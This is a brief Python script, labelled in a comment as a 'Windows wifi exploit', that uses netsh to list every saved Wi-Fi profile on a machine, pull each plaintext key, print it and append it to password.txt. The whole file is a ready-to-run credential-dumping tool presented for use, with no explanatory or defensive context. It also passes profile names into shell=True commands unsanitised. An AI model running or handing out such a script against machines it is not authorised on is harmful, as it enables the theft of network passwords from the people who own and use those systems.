import subprocess as s

#2019 windows wifi exploit::: netsh wlan show proofile name="ssid" key=clear

ssid=s.run("netsh wlan show profile",shell=True,capture_output=True).stdout.decode()
ssid=ssid[ssid.find("All User Profile"):].splitlines()
ssid.remove("")
for i in ssid:
	l=i.find(":")+1
	password=s.run('netsh wlan show profile name="{}" key=clear'.format(i[l:].strip()),shell=True,capture_output=True).stdout.decode()
	password=password[password.find("Key Content"):]
	password=password[:password.find("\r\n\r\n")]
	print("ssid:{},\t {} ".format(i[l:],password))
	with open("password.txt","a") as f:
		f.write("ssid:{},\t {}\n\n ".format(i[l:].strip(),password.strip()))

	




